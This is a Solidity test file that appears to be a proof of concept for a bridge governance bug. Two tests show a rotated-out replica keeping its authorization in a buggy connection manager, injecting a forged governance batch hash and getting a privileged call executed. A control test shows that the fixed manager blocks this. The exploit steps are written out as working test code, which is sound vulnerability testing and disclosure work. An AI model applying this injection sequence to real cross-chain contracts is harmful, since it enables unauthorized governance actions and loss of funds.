// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {
    GovernanceBatchInjectionTarget,
    GovernanceBatchMessageLite,
    GovernanceBatchReplicaCallerHarness
} from "../src/GovernanceBatchInjectionHarness.sol";
import {
    XAppConnectionManagerBug,
    XAppConnectionManagerFixed
} from "../src/XAppConnectionManagerHarness.sol";

contract GovernanceBatchInjectionViaStaleReplicaTest {
    uint32 internal constant ENROLL_DOMAIN = 1;
    uint32 internal constant GOVERNOR_DOMAIN = 2000;
    bytes32 internal constant GOVERNOR_ROUTER = bytes32(uint256(0xBEEF));

    function _assertTrue(bool _condition, string memory _message) internal pure {
        require(_condition, _message);
    }

    /// @notice End-to-end witness:
    /// 1) rotate R1 -> R2 in buggy manager
    /// 2) stale R1 injects forged governance batch hash
    /// 3) permissionless executeCallBatch runs privileged local call
    function test_stale_replica_can_inject_and_execute_governance_batch_in_buggy_manager()
        public
    {
        XAppConnectionManagerBug bug = new XAppConnectionManagerBug();
        GovernanceBatchInjectionTarget gov = new GovernanceBatchInjectionTarget(
            address(bug),
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceBatchReplicaCallerHarness r1 = new GovernanceBatchReplicaCallerHarness();
        GovernanceBatchReplicaCallerHarness r2 = new GovernanceBatchReplicaCallerHarness();

        bug.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        bug.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        _assertTrue(
            bug.isReplica(address(r1)),
            "expected stale replica auth in buggy manager"
        );

        GovernanceBatchMessageLite.Call[]
            memory calls = new GovernanceBatchMessageLite.Call[](1);
        calls[0] = GovernanceBatchMessageLite.Call({
            to: bytes32(uint256(uint160(address(gov)))),
            data: abi.encodeWithSignature("privilegedSet(uint256)", 777)
        });

        bytes32 batchHash = GovernanceBatchMessageLite.getBatchHash(calls);
        bytes memory batchMsg = GovernanceBatchMessageLite.formatBatch(batchHash);

        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            batchMsg
        );
        _assertTrue(okHandle, "retired replica failed to inject forged batch");

        gov.executeCallBatch(calls);
        _assertTrue(gov.criticalValue() == 777, "forged batch did not execute");
    }

    /// @notice Fuzz witness: stale replica can repeatedly execute forged privileged batches.
    function testFuzz_buggy_manager_stale_replica_executes_forged_batch(
        uint256 value
    ) public {
        XAppConnectionManagerBug bug = new XAppConnectionManagerBug();
        GovernanceBatchInjectionTarget gov = new GovernanceBatchInjectionTarget(
            address(bug),
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceBatchReplicaCallerHarness r1 = new GovernanceBatchReplicaCallerHarness();
        GovernanceBatchReplicaCallerHarness r2 = new GovernanceBatchReplicaCallerHarness();

        bug.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        bug.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        GovernanceBatchMessageLite.Call[]
            memory calls = new GovernanceBatchMessageLite.Call[](1);
        calls[0] = GovernanceBatchMessageLite.Call({
            to: bytes32(uint256(uint160(address(gov)))),
            data: abi.encodeWithSignature("privilegedSet(uint256)", value)
        });

        bytes32 batchHash = GovernanceBatchMessageLite.getBatchHash(calls);
        bytes memory batchMsg = GovernanceBatchMessageLite.formatBatch(batchHash);

        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            batchMsg
        );
        _assertTrue(okHandle, "stale replica could not inject forged batch");

        gov.executeCallBatch(calls);
        _assertTrue(
            gov.criticalValue() == value,
            "forged executeCallBatch path failed"
        );
    }

    /// @notice Control: fixed enrollment logic revokes stale auth, so injection fails.
    function test_fixed_manager_blocks_stale_batch_injection() public {
        XAppConnectionManagerFixed fixedXcm = new XAppConnectionManagerFixed();
        GovernanceBatchInjectionTarget gov = new GovernanceBatchInjectionTarget(
            address(fixedXcm),
            GOVERNOR_DOMAIN,
            GOVERNOR_ROUTER
        );

        GovernanceBatchReplicaCallerHarness r1 = new GovernanceBatchReplicaCallerHarness();
        GovernanceBatchReplicaCallerHarness r2 = new GovernanceBatchReplicaCallerHarness();

        fixedXcm.ownerEnrollReplica(address(r1), ENROLL_DOMAIN);
        fixedXcm.ownerEnrollReplica(address(r2), ENROLL_DOMAIN);

        _assertTrue(
            !fixedXcm.isReplica(address(r1)),
            "fixed manager should revoke stale replica auth"
        );

        GovernanceBatchMessageLite.Call[]
            memory calls = new GovernanceBatchMessageLite.Call[](1);
        calls[0] = GovernanceBatchMessageLite.Call({
            to: bytes32(uint256(uint160(address(gov)))),
            data: abi.encodeWithSignature("privilegedSet(uint256)", 123)
        });

        bytes32 batchHash = GovernanceBatchMessageLite.getBatchHash(calls);
        bytes memory batchMsg = GovernanceBatchMessageLite.formatBatch(batchHash);

        (bool okHandle, ) = r1.callHandle(
            address(gov),
            GOVERNOR_DOMAIN,
            0,
            GOVERNOR_ROUTER,
            batchMsg
        );
        _assertTrue(!okHandle, "stale replica unexpectedly injected forged batch");

        bool reverted;
        try gov.executeCallBatch(calls) {
            reverted = false;
        } catch {
            reverted = true;
        }
        _assertTrue(reverted, "executeCallBatch unexpectedly succeeded");
        _assertTrue(gov.criticalValue() == 0, "critical state unexpectedly changed");
    }
}

